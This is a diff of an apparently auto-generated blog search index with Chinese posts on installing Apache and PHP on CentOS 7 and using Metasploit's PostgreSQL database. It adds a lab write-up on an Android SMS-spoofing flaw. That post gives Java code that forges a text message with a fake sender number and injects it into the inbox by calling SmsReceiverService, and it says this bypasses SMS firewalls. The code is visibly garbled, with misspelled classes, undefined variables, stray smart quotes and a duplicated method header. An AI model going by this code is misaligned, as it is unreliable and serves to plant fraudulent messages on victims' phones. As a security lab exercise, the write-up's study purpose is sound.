-<h3 id="安装Apache："><a href="#安装Apache：" class="headerlink" title="安装Apache："></a>安装Apache：</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">[root@cn7]/#</span><span class="bash"> yum -y install httpd</span></span><br></pre></td></tr></table></figure>
-
-<h3 id="查看http状态："><a href="#查看http状态：" class="headerlink" title="查看http状态："></a>查看http状态：</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">[root@cn7]/#</span><span class="bash"> systemctl status httpd</span></span><br><span class="line">● httpd.service - The Apache HTTP Server</span><br><span class="line">   Loaded: loaded (/usr/lib/systemd/system/httpd.service; disabled; vendor preset: disabled)</span><br><span class="line">   Active: inactive (dead)</span><br><span class="line">     Docs: man:httpd(8)</span><br><span class="line">           man:apachectl(8)</span><br></pre></td></tr></table></figure>
-
-<h3 id="启动Apache并设置为开机启动："><a href="#启动Apache并设置为开机启动：" class="headerlink" title="启动Apache并设置为开机启动："></a>启动Apache并设置为开机启动：</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">[root@cn7]/#</span><span class="bash"> systemctl start httpd</span></span><br><span class="line"><span class="meta">[root@cn7]/#</span><span class="bash"> systemctl <span class="built_in">enable</span> httpd</span></span><br><span class="line">Created symlink from /etc/systemd/system/multi-user.target.wants/httpd.service to /usr/lib/systemd/system/httpd.service.</span><br></pre></td></tr></table></figure>
-
-<h3 id="再次查看Apache状态："><a href="#再次查看Apache状态：" class="headerlink" title="再次查看Apache状态："></a>再次查看Apache状态：</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">[root@cn7]/#</span><span class="bash"> systemctl status httpd</span></span><br><span class="line">● httpd.service - The Apache HTTP Server</span><br><span class="line">   Loaded: loaded (/usr/lib/systemd/system/httpd.service; enabled; vendor preset: disabled)</span><br><span class="line">   Active: active (running) since 六 2021-08-28 21:28:05 CST; 1min 17s ago</span><br><span class="line">     Docs: man:httpd(8)</span><br><span class="line">           man:apachectl(8)</span><br><span class="line"> Main PID: 1358 (httpd)</span><br><span class="line">   Status: &quot;Total requests: 0; Current requests/sec: 0; Current traffic:   0 B/sec&quot;</span><br><span class="line">   CGroup: /system.slice/httpd.service</span><br><span class="line">           ├─1358 /usr/sbin/httpd -DFOREGROUND</span><br><span class="line">           ├─1359 /usr/sbin/httpd -DFOREGROUND</span><br><span class="line">           ├─1360 /usr/sbin/httpd -DFOREGROUND</span><br><span class="line">           ├─1361 /usr/sbin/httpd -DFOREGROUND</span><br><span class="line">           ├─1362 /usr/sbin/httpd -DFOREGROUND</span><br><span class="line">           └─1363 /usr/sbin/httpd -DFOREGROUND</span><br><span class="line"></span><br><span class="line">8月 28 21:27:34 cn7 systemd[1]: Starting The Apache HTTP Server...</span><br><span class="line">8月 28 21:27:54 cn7 httpd[1358]: AH00558: httpd: Could not reliably determine the server&#x27;s fully qualified dom...essage</span><br><span class="line">8月 28 21:28:05 cn7 systemd[1]: Started The Apache HTTP Server.</span><br><span class="line">Hint: Some lines were ellipsized, use -l to show in full.</span><br></pre></td></tr></table></figure>
-
-<h3 id="查看Apache版本"><a href="#查看Apache版本" class="headerlink" title="查看Apache版本"></a>查看Apache版本</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">[root@cn7]/#</span><span class="bash"> httpd -v</span></span><br><span class="line">Server version: Apache/2.4.6 (CentOS)</span><br><span class="line">Server built:   Nov 16 2020 16:18:20</span><br></pre></td></tr></table></figure>
-
-<h3 id="使用ss查看端口监听状态"><a href="#使用ss查看端口监听状态" class="headerlink" title="使用ss查看端口监听状态"></a>使用ss查看端口监听状态</h3><p>（ss -tnl     [t：tcp,n：数字显示,l：监听]）</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">[root@cn7]/#</span><span class="bash"> ss -tnl</span></span><br><span class="line">State      Recv-Q Send-Q               Local Address:Port                              Peer Address:Port</span><br><span class="line">LISTEN     0      128                              *:22                                           *:*</span><br><span class="line">LISTEN     0      100                      127.0.0.1:25                                           *:*</span><br><span class="line">LISTEN     0      128                           [::]:22                                        [::]:*</span><br><span class="line">LISTEN     0      100                          [::1]:25                                        [::]:*</span><br><span class="line">LISTEN     0      128                           [::]:80                                        [::]:*</span><br></pre></td></tr></table></figure>
-
-<h3 id="访问虚拟机的ip地址"><a href="#访问虚拟机的ip地址" class="headerlink" title="访问虚拟机的ip地址"></a>访问虚拟机的ip地址</h3><p>如果能访问即成功。</p>
-]]></content>
-      <tags>
-        <tag>apache</tag>
-        <tag>centos7</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>centos7安装mariadb</title>
     <url>/blog/2021/11/24/centos7%E5%AE%89%E8%A3%85mariadb/</url>
     <content><![CDATA[<h2 id="centos7安装mariadb"><a href="#centos7安装mariadb" class="headerlink" title="centos7安装mariadb"></a>centos7安装mariadb</h2><p>mariadb是MYSQL的一个分支，语法基本和mysql一样，而且兼容mysql，centos7中自带了mariadb的软件包。</p>
@@ -369,26 +303,69 @@
       </tags>
   </entry>
   <entry>
-    <title>centos7安装php</title>
-    <url>/blog/2021/11/24/centos7%E5%AE%89%E8%A3%85php/</url>
-    <content><![CDATA[<h2 id="centos7安装php"><a href="#centos7安装php" class="headerlink" title="centos7安装php"></a>centos7安装php</h2><p>环境是apache2+mariadb+php</p>
-<p>先安装php</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">[root@cn7]/#</span><span class="bash"> yum -y install php</span></span><br></pre></td></tr></table></figure>
+    <title>centos7安装apache</title>
+    <url>/blog/2021/11/24/centos7%E5%AE%89%E8%A3%85apache/</url>
+    <content><![CDATA[<h2 id="centos7-安装Apache"><a href="#centos7-安装Apache" class="headerlink" title="centos7 安装Apache"></a>centos7 安装Apache</h2><h3 id="实验准备：vmware上安装的centos7"><a href="#实验准备：vmware上安装的centos7" class="headerlink" title="实验准备：vmware上安装的centos7"></a>实验准备：vmware上安装的centos7</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">[root@cn7]/#</span><span class="bash"> uname -a</span></span><br><span class="line">Linux cn7 3.10.0-1160.el7.x86_64 #1 SMP Mon Oct 19 16:18:59 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux</span><br><span class="line"><span class="meta">[root@cn7]/#</span><span class="bash"> cat /etc/redhat-release</span></span><br><span class="line">CentOS Linux release 7.9.2009 (Core)</span><br></pre></td></tr></table></figure>
 
-<p>安装php相关组件</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">[root@cn7]/#</span><span class="bash"> yum -y install php-mysql php-gd php-ldap php-odbc php-pear php-xml php-xmlrpc php-mbstring php-bcmath php-mhash</span></span><br><span class="line"><span class="meta">[root@cn7]/#</span><span class="bash"> systemctl restart mariadb</span></span><br><span class="line"><span class="meta">[root@cn7]/#</span><span class="bash"> systemctl restart httpd</span></span><br></pre></td></tr></table></figure>
+<h3 id="安装Apache："><a href="#安装Apache：" class="headerlink" title="安装Apache："></a>安装Apache：</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">[root@cn7]/#</span><span class="bash"> yum -y install httpd</span></span><br></pre></td></tr></table></figure>
 
-<p>通过php -v 查看信息</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">[root@cn7]/var/www/html#</span><span class="bash"> php -v</span></span><br><span class="line">PHP 5.4.16 (cli) (built: Apr  1 2020 04:07:17)</span><br><span class="line">Copyright (c) 1997-2013 The PHP Group</span><br><span class="line">Zend Engine v2.4.0, Copyright (c) 1998-2013 Zend Technologies</span><br></pre></td></tr></table></figure>
+<h3 id="查看http状态："><a href="#查看http状态：" class="headerlink" title="查看http状态："></a>查看http状态：</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">[root@cn7]/#</span><span class="bash"> systemctl status httpd</span></span><br><span class="line">● httpd.service - The Apache HTTP Server</span><br><span class="line">   Loaded: loaded (/usr/lib/systemd/system/httpd.service; disabled; vendor preset: disabled)</span><br><span class="line">   Active: inactive (dead)</span><br><span class="line">     Docs: man:httpd(8)</span><br><span class="line">           man:apachectl(8)</span><br></pre></td></tr></table></figure>
 
-<p>进入/var/www/html目录编写一个测试页面</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">[root@cn7]/var/www/html#</span><span class="bash"> vim index.php</span></span><br><span class="line">&lt;?php</span><br><span class="line">phpinfo();</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<h3 id="启动Apache并设置为开机启动："><a href="#启动Apache并设置为开机启动：" class="headerlink" title="启动Apache并设置为开机启动："></a>启动Apache并设置为开机启动：</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">[root@cn7]/#</span><span class="bash"> systemctl start httpd</span></span><br><span class="line"><span class="meta">[root@cn7]/#</span><span class="bash"> systemctl <span class="built_in">enable</span> httpd</span></span><br><span class="line">Created symlink from /etc/systemd/system/multi-user.target.wants/httpd.service to /usr/lib/systemd/system/httpd.service.</span><br></pre></td></tr></table></figure>
 
-<p>最后访问页面，有php相关信息成功</p>
+<h3 id="再次查看Apache状态："><a href="#再次查看Apache状态：" class="headerlink" title="再次查看Apache状态："></a>再次查看Apache状态：</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">[root@cn7]/#</span><span class="bash"> systemctl status httpd</span></span><br><span class="line">● httpd.service - The Apache HTTP Server</span><br><span class="line">   Loaded: loaded (/usr/lib/systemd/system/httpd.service; enabled; vendor preset: disabled)</span><br><span class="line">   Active: active (running) since 六 2021-08-28 21:28:05 CST; 1min 17s ago</span><br><span class="line">     Docs: man:httpd(8)</span><br><span class="line">           man:apachectl(8)</span><br><span class="line"> Main PID: 1358 (httpd)</span><br><span class="line">   Status: &quot;Total requests: 0; Current requests/sec: 0; Current traffic:   0 B/sec&quot;</span><br><span class="line">   CGroup: /system.slice/httpd.service</span><br><span class="line">           ├─1358 /usr/sbin/httpd -DFOREGROUND</span><br><span class="line">           ├─1359 /usr/sbin/httpd -DFOREGROUND</span><br><span class="line">           ├─1360 /usr/sbin/httpd -DFOREGROUND</span><br><span class="line">           ├─1361 /usr/sbin/httpd -DFOREGROUND</span><br><span class="line">           ├─1362 /usr/sbin/httpd -DFOREGROUND</span><br><span class="line">           └─1363 /usr/sbin/httpd -DFOREGROUND</span><br><span class="line"></span><br><span class="line">8月 28 21:27:34 cn7 systemd[1]: Starting The Apache HTTP Server...</span><br><span class="line">8月 28 21:27:54 cn7 httpd[1358]: AH00558: httpd: Could not reliably determine the server&#x27;s fully qualified dom...essage</span><br><span class="line">8月 28 21:28:05 cn7 systemd[1]: Started The Apache HTTP Server.</span><br><span class="line">Hint: Some lines were ellipsized, use -l to show in full.</span><br></pre></td></tr></table></figure>
+
+<h3 id="查看Apache版本"><a href="#查看Apache版本" class="headerlink" title="查看Apache版本"></a>查看Apache版本</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">[root@cn7]/#</span><span class="bash"> httpd -v</span></span><br><span class="line">Server version: Apache/2.4.6 (CentOS)</span><br><span class="line">Server built:   Nov 16 2020 16:18:20</span><br></pre></td></tr></table></figure>
+
+<h3 id="使用ss查看端口监听状态"><a href="#使用ss查看端口监听状态" class="headerlink" title="使用ss查看端口监听状态"></a>使用ss查看端口监听状态</h3><p>（ss -tnl     [t：tcp,n：数字显示,l：监听]）</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">[root@cn7]/#</span><span class="bash"> ss -tnl</span></span><br><span class="line">State      Recv-Q Send-Q               Local Address:Port                              Peer Address:Port</span><br><span class="line">LISTEN     0      128                              *:22                                           *:*</span><br><span class="line">LISTEN     0      100                      127.0.0.1:25                                           *:*</span><br><span class="line">LISTEN     0      128                           [::]:22                                        [::]:*</span><br><span class="line">LISTEN     0      100                          [::1]:25                                        [::]:*</span><br><span class="line">LISTEN     0      128                           [::]:80                                        [::]:*</span><br></pre></td></tr></table></figure>
+
+<h3 id="访问虚拟机的ip地址"><a href="#访问虚拟机的ip地址" class="headerlink" title="访问虚拟机的ip地址"></a>访问虚拟机的ip地址</h3><p>如果能访问即成功。</p>
 ]]></content>
       <tags>
         <tag>centos7</tag>
-        <tag>php</tag>
+        <tag>apache</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Android安全之短信欺诈漏洞</title>
+    <url>/blog/2021/12/27/Android%E5%AE%89%E5%85%A8%E4%B9%8B%E7%9F%AD%E4%BF%A1%E6%AC%BA%E8%AF%88%E6%BC%8F%E6%B4%9E/</url>
+    <content><![CDATA[<p>目的：</p>
+<ul>
+<li>通过JAVA编程理解Android手机安全漏洞的基本原理</li>
+<li>用JAVA编写伪造短信代码，向系统收件箱发送伪造短信</li>
+</ul>
+<p>原理：</p>
+<ul>
+<li>漏洞原理介绍</li>
+<li>该系统漏洞能够使攻击者无需申请任何权限发送短信到用户收件箱。 出现该漏洞的原因是Android系统的com.android.mms.transaction。</li>
+<li>SmsReceiverService系统服务未判断启动服务的调用者，攻击者可以通过该应用发送伪装短信到用户收件箱。本漏洞实质上是一种能力的泄漏。</li>
+<li>漏洞发送的短信并不经过GSM网络,所以即使手机没有插sim卡,也照样可以收到短信,这让大部分的短信防火墙完全失效。</li>
+</ul>
+<p>过程：</p>
+<p>打开eclipse，点击file-import，选择android目录下的existing android code into workspace<img src="https://gitee.com/oxchang/img-host/raw/master/Android%E5%AE%89%E5%85%A8%E4%B9%8B%E7%9F%AD%E4%BF%A1%E6%AC%BA%E8%AF%88%E6%BC%8F%E6%B4%9E/image-20211229100046569.png" alt="image-20211229100046569"></p>
+<p>选择simpleedu28项目<img src="https://gitee.com/oxchang/img-host/raw/master/Android%E5%AE%89%E5%85%A8%E4%B9%8B%E7%9F%AD%E4%BF%A1%E6%AC%BA%E8%AF%88%E6%BC%8F%E6%B4%9E/image-20211229100118574.png" alt="image-20211229100118574"></p>
+<p>导入后的项目<img src="https://gitee.com/oxchang/img-host/raw/master/Android%E5%AE%89%E5%85%A8%E4%B9%8B%E7%9F%AD%E4%BF%A1%E6%AC%BA%E8%AF%88%E6%BC%8F%E6%B4%9E/image-20211229100200697.png" alt="image-20211229100200697"></p>
+<p>在工程目录res/layout的界面代码，这里可以通过控制代码，编辑相应的函数生成欺诈短信，点击activity_main.xml，可以看到界面布局的文件<img src="https://gitee.com/oxchang/img-host/raw/master/Android%E5%AE%89%E5%85%A8%E4%B9%8B%E7%9F%AD%E4%BF%A1%E6%AC%BA%E8%AF%88%E6%BC%8F%E6%B4%9E/image-20211229100257165.png" alt="image-20211229100257165"></p>
+<p>在mainactivity中添加运行欺诈短信的代码，点开<code>msgdemo2\src\com.example.msgdemol\mainactivity.java</code><img src="https://gitee.com/oxchang/img-host/raw/master/Android%E5%AE%89%E5%85%A8%E4%B9%8B%E7%9F%AD%E4%BF%A1%E6%AC%BA%E8%AF%88%E6%BC%8F%E6%B4%9E/image-20211229100406295.png" alt="image-20211229100406295"></p>
+<p>在mainactivity的init()函数添加如下代码，为button设置监听事件</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//为发送按钮设置监听</span></span><br><span class="line">sendBt.setOnClickListener(<span class="keyword">new</span> OnClickListener()&#123;</span><br><span class="line">       <span class="meta">@Override</span></span><br><span class="line">       <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onClick</span><span class="params">(View v)</span></span>&#123;</span><br><span class="line">                       <span class="comment">/*</span></span><br><span class="line"><span class="comment">                 *获取输入的伪造号码和内</span></span><br><span class="line"><span class="comment">                 *判断输入是否合法</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">String num=msgNumTv.getText().toString();</span><br><span class="line">String con=msgConTv.getText().toString();</span><br><span class="line">If(num.length()&lt;<span class="number">1</span>||con.length()&lt;<span class="number">1</span>)</span><br><span class="line">&#123; Toast.makeText(MainActivity.<span class="keyword">this</span>,”电话号码或者内容没有输入”,Toast.LENGTH_SHORT).show();</span><br><span class="line"><span class="keyword">return</span>;&#125;</span><br><span class="line"><span class="comment">//判断通过伪造短信</span></span><br><span class="line"><span class="comment">//make Msg(MainActivity.this,num,con);</span></span><br><span class="line">createFakeMsg(MainActivity.<span class="keyword">this</span>,num,con);&#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
+
+<p>在MainActivity的init()函数,跳转到init函数位置添加上一步的代码</p>
+<p><img src="https://gitee.com/oxchang/img-host/raw/master/Android%E5%AE%89%E5%85%A8%E4%B9%8B%E7%9F%AD%E4%BF%A1%E6%AC%BA%E8%AF%88%E6%BC%8F%E6%B4%9E/image-20211229101856123.png" alt="image-20211229101856123">createFakeMsg的具体代码</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> *伪造短信</span></span><br><span class="line"><span class="comment">* <span class="doctag">@param</span> context</span></span><br><span class="line"><span class="comment"><span class="doctag">@param</span> num</span></span><br><span class="line"><span class="comment">* <span class="doctag">@param</span> con</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">          <span class="function">Private <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">createFakeMsg</span><span class="params">(Context context,String num,String con)</span></span>&#123;</span><br><span class="line">                <span class="keyword">byte</span>[] pdu=<span class="keyword">null</span>;</span><br><span class="line">                <span class="keyword">byte</span>[] scBytes=PhoneNumberUtils.networkPortionToCalledPartyBCD(num);</span><br><span class="line">                <span class="keyword">int</span> lsmcs=scBytes.length;</span><br><span class="line">                <span class="keyword">byte</span>[] dateBytes=<span class="keyword">new</span> <span class="keyword">byte</span>[<span class="number">7</span>];</span><br><span class="line">                Calendar calendar=<span class="keyword">new</span> GregorianCalendar();</span><br><span class="line">                dateBytes[<span class="number">0</span>]=reverseByte((<span class="keyword">byte</span>)(calendar.get(Caledar.YEAR)));</span><br><span class="line">                dateBytes[<span class="number">1</span>]=reverseByte((<span class="keyword">byte</span>)(calendar.get(Caledar.MONTH)+<span class="number">1</span>));</span><br><span class="line">                dateBytes[<span class="number">2</span>]=reverseByte((<span class="keyword">byte</span>)(calendar.get(Caledar.DAY_OF_MONTH)));</span><br><span class="line">                dateBytes[<span class="number">3</span>]=reverseByte((<span class="keyword">byte</span>)(calendar.get(Caledar.HOUR_OF_DAY)));</span><br><span class="line">                dateBytes[<span class="number">4</span>]=reverseByte((<span class="keyword">byte</span>)(calendar.get(Caledar.MINUTE)));</span><br><span class="line">                dateBytes[<span class="number">5</span>]=reverseByte((<span class="keyword">byte</span>)(calendar.get(Caledar.SECOND)));</span><br><span class="line">                dateBytes[<span class="number">6</span>]=reverseByte((<span class="keyword">byte</span>)(（calendar.get(Caledar.ZONE_OFFSET)+calendar.get(Calendar.DST_OFFSET))/(<span class="number">60</span>*<span class="number">1000</span>*<span class="number">15</span>)）);</span><br><span class="line">                <span class="keyword">try</span>&#123;</span><br><span class="line">          <span class="comment">// Log.d(LOG,”test one”);</span></span><br><span class="line">                 ByteArrayOutputStream bo=<span class="keyword">new</span> ByteArrayOutputStream();</span><br><span class="line">                 bo.write(lsmcs);</span><br><span class="line">                 bo.write(scBytes);</span><br><span class="line">                 bo.write(<span class="number">0x04</span>);</span><br><span class="line">                 bo.write((<span class="keyword">byte</span>)num.length());</span><br><span class="line">                 bo.write(senderBytes);</span><br><span class="line">                 bo.write(<span class="number">0x00</span>);</span><br><span class="line">                 bo.write(<span class="number">0x00</span>);<span class="comment">//encoding:0 for default 7bit</span></span><br><span class="line">                 bo.write(dateBytes);</span><br><span class="line">                 <span class="keyword">try</span>&#123;</span><br><span class="line">          String sReflectedClassName=”com.android.internal.telephony.GsmAlphabet”;</span><br><span class="line">          Class cRefectedNFCExtras=Class.forName(sReflectedClassName);</span><br><span class="line">          Method stringToGsm7BitPacketd=cReflectedNFCExtras.getMethod(“stringToGsm7BitPacketd”,<span class="keyword">new</span> Clas[]&#123;String.class&#125;);</span><br><span class="line">          stringToGsm7BitPacked.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">          <span class="keyword">byte</span>[] conbytes=(<span class="keyword">byte</span>[]) stringToGsm7BitPacked.invoke(<span class="keyword">null</span>,con);</span><br><span class="line">          bo.write(conbytes);</span><br><span class="line">          &#125;<span class="keyword">catch</span>(Exception e)&#123;e.printStackTrace();&#125;</span><br><span class="line">          pdu=bo.toByteArray();&#125;</span><br><span class="line">          <span class="keyword">catch</span>(IOException e)&#123;e.printStackTrace();&#125;</span><br><span class="line">          Intent intent=newIntent();</span><br><span class="line">          Intent.setClassName（“com.android.mms.transaction.SmsReceiverService”）;</span><br><span class="line">          Intent.setAction(“android.provider.Telephony.SMS_RECEIVED”);</span><br><span class="line">          Intent.putExtra(“pdus”,<span class="keyword">new</span> Object[]&#123;pdu&#125;);</span><br><span class="line">          <span class="comment">//intent.putExtra(“format”,”3gpp”);</span></span><br><span class="line">          Context.startService(intent);&#125;</span><br><span class="line">          <span class="function">Private <span class="keyword">static</span> <span class="keyword">byte</span> <span class="title">reverseByte</span><span class="params">(<span class="keyword">byte</span> b)</span></span>&#123;</span><br><span class="line">          <span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">byte</span> <span class="title">reverseByte</span><span class="params">(<span class="keyword">byte</span> b)</span></span>&#123;</span><br><span class="line">          <span class="keyword">return</span> (<span class="keyword">byte</span>)((b&amp;<span class="number">0xf0</span>)&gt;&gt;<span class="number">4</span>|(b&amp;<span class="number">0x0f</span>)&lt;&lt;<span class="number">4</span>);&#125;</span><br></pre></td></tr></table></figure>
+
+<p>在已经设计好的欺诈短信发送界面，有两部分内容：伪造号码与伪造内容。这里的伪造号码，这是发件人的号码，因为是发给自己，所以没有收件人号码，。至于内容可以随意填写内容，使短信更具欺诈性。</p>
+<p>AVD中打开虚拟机Simpleedu28虚拟安卓<img src="https://gitee.com/oxchang/img-host/raw/master/Android%E5%AE%89%E5%85%A8%E4%B9%8B%E7%9F%AD%E4%BF%A1%E6%AC%BA%E8%AF%88%E6%BC%8F%E6%B4%9E/image-20211229102354469.png" alt="image-20211229102354469"></p>
+<p>右键MSGDEMO2，选择run as-android application按钮<img src="https://gitee.com/oxchang/img-host/raw/master/Android%E5%AE%89%E5%85%A8%E4%B9%8B%E7%9F%AD%E4%BF%A1%E6%AC%BA%E8%AF%88%E6%BC%8F%E6%B4%9E/image-20211229102712162.png" alt="image-20211229102712162"></p>
+<p>虚拟端返回运行后结果<img src="https://gitee.com/oxchang/img-host/raw/master/Android%E5%AE%89%E5%85%A8%E4%B9%8B%E7%9F%AD%E4%BF%A1%E6%AC%BA%E8%AF%88%E6%BC%8F%E6%B4%9E/image-20211229102740838.png" alt="image-20211229102740838"></p>
+<p>点击发送，手机接收欺诈短信</p>
+<p><img src="https://gitee.com/oxchang/img-host/raw/master/Android%E5%AE%89%E5%85%A8%E4%B9%8B%E7%9F%AD%E4%BF%A1%E6%AC%BA%E8%AF%88%E6%BC%8F%E6%B4%9E/image-20211229102848974.png" alt="image-20211229102848974"></p>
+]]></content>
+      <tags>
+        <tag>Android</tag>
+        <tag>短信</tag>
+        <tag>欺诈</tag>
       </tags>
   </entry>
   <entry>
@@ -400,59 +377,6 @@
 ]]></content>
       <tags>
         <tag>test</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>metasploit之PostgreSQL</title>
-    <url>/blog/2021/12/21/metasploit%E4%B9%8BPostgreSQL/</url>
-    <content><![CDATA[<h2 id="metasploit之PostgreSQL"><a href="#metasploit之PostgreSQL" class="headerlink" title="metasploit之PostgreSQL"></a>metasploit之PostgreSQL</h2><h3 id="目的：-Metasploit自带数据库（PostgreSQL）操作"><a href="#目的：-Metasploit自带数据库（PostgreSQL）操作" class="headerlink" title="目的： Metasploit自带数据库（PostgreSQL）操作"></a>目的： Metasploit自带数据库（PostgreSQL）操作</h3><h3 id="原理："><a href="#原理：" class="headerlink" title="原理："></a>原理：</h3><p><code>db_status</code>     查看数据库连接状态</p>
-<p><code>db_connect</code>  链接数据库</p>
-<p><code>db_disconnect</code>    断开连接</p>
-<p><code>vulns</code>     查看数据库扫描的主机的漏洞</p>
-<p><code>workspace</code>   工作空间，相对于独立的</p>
-<h3 id="过程："><a href="#过程：" class="headerlink" title="过程："></a>过程：</h3><p>打开终端，运行msfconsole,<code>db_status</code>查看数据库连接状态，如果已连接执行<code>db_disconnect</code></p>
-<p><img src="https://gitee.com/oxchang/img-host/raw/master/metasploit%E4%B9%8BPostgreSQL/1.PNG"></p>
-<p>exit退出软件，执行<code>service postgresql start</code>,启动数据库，<code>netstat -ntlp | grep postgre</code>查询是否启动成功，端口为<code>5432</code></p>
-<p><img src="https://gitee.com/oxchang/img-host/raw/master/metasploit%E4%B9%8BPostgreSQL/2.PNG"></p>
-<p>重新运行msf,<code>db_status</code>查看是否连接<code>数据库</code></p>
-<p><img src="https://gitee.com/oxchang/img-host/raw/master/metasploit%E4%B9%8BPostgreSQL/3.PNG"></p>
-<p><code>db_disconnect</code>断开连接，<code>db_status</code>查看连接状态</p>
-<p><img src="https://gitee.com/oxchang/img-host/raw/master/metasploit%E4%B9%8BPostgreSQL/4.PNG"></p>
-<p>手动使用命令连接数据库，须知<code>数据库名</code>，<code>用户名</code>，<code>ip</code>以及<code>密码</code>，新建窗口，查询数据库配置文件，执行<code>find / -name database.yml</code></p>
-<p><img src="https://gitee.com/oxchang/img-host/raw/master/metasploit%E4%B9%8BPostgreSQL/5.PNG"></p>
-<p><code>cat /usr/share/metasploit-framework/config/database.yml</code>，查看配置文件</p>
-<p><img src="https://gitee.com/oxchang/img-host/raw/master/metasploit%E4%B9%8BPostgreSQL/6.PNG"></p>
-<p>返回msf界面，db_connect查看使用方法，选择第二种<code>db_connect 用户名:密码@ip/数据库名</code>，配置信息是<code>development</code>标签内的</p>
-<p><img src="https://gitee.com/oxchang/img-host/raw/master/metasploit%E4%B9%8BPostgreSQL/7.PNG"><br><img src="https://gitee.com/oxchang/img-host/raw/master/metasploit%E4%B9%8BPostgreSQL/8.PNG"></p>
-<p>退出msf，执行<code>su postgres</code></p>
-<p><img src="https://gitee.com/oxchang/img-host/raw/master/metasploit%E4%B9%8BPostgreSQL/9.PNG"></p>
-<p>创建新用户sub1及密码：<code>createuser sub1 -P</code>,回车并输入密码123456两次，<code>createdb --owner=sub1 test</code>连接数据库test，完成后exit退出</p>
-<p><img src="https://gitee.com/oxchang/img-host/raw/master/metasploit%E4%B9%8BPostgreSQL/10.PNG"></p>
-<p>运行msfconsole，db_disconnect断开连接，执行<code>db_connect sub1:123456@localhost/test</code>连接刚才的数据库，<code>db_status</code>查看状态</p>
-<p><img src="https://gitee.com/oxchang/img-host/raw/master/metasploit%E4%B9%8BPostgreSQL/11.PNG"></p>
-<p>退出msf,编辑<code>/etc/postgresql/9.5/main/postgresql.conf</code>文件，<code>shift+：</code>输入<code>set number</code>调出行号</p>
-<p><img src="https://gitee.com/oxchang/img-host/raw/master/metasploit%E4%B9%8BPostgreSQL/12.PNG"></p>
-<p>找到59行，将#去掉，并且把<code>localhost</code>改为*，88行去掉#,然后保存退出</p>
-<p><img src="https://gitee.com/oxchang/img-host/raw/master/metasploit%E4%B9%8BPostgreSQL/13.PNG"></p>
-<p>编辑<code>/etc/postgresql/9.5/main/pg_hba.conf</code>,最后一行添加<code>host all all 0.0.0.0/32 md5</code>，保存退出</p>
-<p><img src="https://gitee.com/oxchang/img-host/raw/master/metasploit%E4%B9%8BPostgreSQL/14.PNG"></p>
-<p><code>service postgresql restart</code>，重启服务</p>
-<p><img src="https://gitee.com/oxchang/img-host/raw/master/metasploit%E4%B9%8BPostgreSQL/15.PNG"></p>
-<p>打开msf，<code>workspace --help</code>查看用法</p>
-<p><img src="https://gitee.com/oxchang/img-host/raw/master/metasploit%E4%B9%8BPostgreSQL/16.PNG"></p>
-<p><code>workspace -v</code>查看工作空间，只有默认的一个</p>
-<p><img src="https://gitee.com/oxchang/img-host/raw/master/metasploit%E4%B9%8BPostgreSQL/17.PNG"></p>
-<p><code>worksapce -a 1</code>,<code>workspace -a 2</code> 添加工作空间1，2，执行<code>workspace -v</code> 查看工作空间</p>
-<p><img src="https://gitee.com/oxchang/img-host/raw/master/metasploit%E4%B9%8BPostgreSQL/18.PNG"></p>
-<p><code>workspace -d 1</code>删除工作空间1，执行<code>workspace -v</code> 查看现有工作空间</p>
-<p><img src="https://gitee.com/oxchang/img-host/raw/master/metasploit%E4%B9%8BPostgreSQL/19.PNG"></p>
-<p><code>workspace 2</code>切换到工作空间2</p>
-<p><code>workspace -d 2</code>删除工作空间2,自动切换到默认工作空间</p>
-<p><img src="https://gitee.com/oxchang/img-host/raw/master/metasploit%E4%B9%8BPostgreSQL/20.PNG"></p>
-]]></content>
-      <tags>
-        <tag>msf</tag>
-        <tag>PostgreSQL</tag>
       </tags>
   </entry>
   <entry>
@@ -529,6 +453,59 @@
       <tags>
         <tag>python</tag>
         <tag>pyautogui</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>metasploit之PostgreSQL</title>
+    <url>/blog/2021/12/21/metasploit%E4%B9%8BPostgreSQL/</url>
